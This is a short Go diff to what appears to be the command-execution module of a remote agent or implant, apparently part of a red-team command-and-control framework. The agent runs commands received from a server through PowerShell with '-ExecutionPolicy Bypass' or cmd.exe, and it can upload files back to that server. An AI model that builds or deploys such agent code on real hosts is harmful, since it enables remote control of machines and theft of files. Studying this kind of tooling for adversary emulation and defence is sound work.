@@ -3,6 +3,7 @@ package commands
 import (
 	"fmt"
 	"os"
+	"reflect"
 	"runtime"
 	"path/filepath"
 	"net/http"
@@ -14,7 +15,7 @@ import (
  )
 
  //RunCommand executes a given command
- func RunCommand(message string, httpServer string) ([]byte, int) {
+ func RunCommand(message string, httpServer string, profile map[string]interface{}) ([]byte, int) {
    if strings.HasPrefix(message, "cd") {
       pieces := strings.Split(message, "cd")
       bites := changeDirectory(pieces[1])
@@ -28,17 +29,21 @@ import (
       go upload(httpServer, pieces[1])
       return []byte("Upload initiated\n"), 0
    } else {
-      bites, status := execute(message)
+      bites, status := execute(message, strings.Split(reflect.ValueOf(profile["executors"]).String(), ",")[0])
       return bites, status
    }
 }
 
- func execute(command string) ([]byte, int) {
+ func execute(command string, executor string) ([]byte, int) {
 	var bites []byte
 	var error error
 	var status int
 	if runtime.GOOS == "windows" {
-	   bites, error = exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
+	    if executor == "cmd" {
+	    	bites, error = exec.Command("cmd.exe", "/c", command).Output()
+	    } else {
+	    	bites, error = exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
+	    }
 	} else {
 	   bites, error = exec.Command("sh", "-c", command).Output()
     }
